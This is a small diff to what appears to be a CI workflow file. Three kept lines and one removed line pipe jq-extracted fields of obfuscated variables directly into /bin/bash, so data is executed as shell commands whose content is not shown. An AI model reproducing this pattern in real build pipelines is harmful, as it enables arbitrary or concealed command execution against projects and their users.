@@ -27,7 +27,6 @@ jobs:
           echo $uu8334 | jq -r .m4171 | /bin/bash
           printf '%s' "$q1847" | jq -r .e8 | /bin/bash
           echo $bve59 | jq -r .yw48057 | /bin/bash
-          echo $llqg1 | jq -r .zg608 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
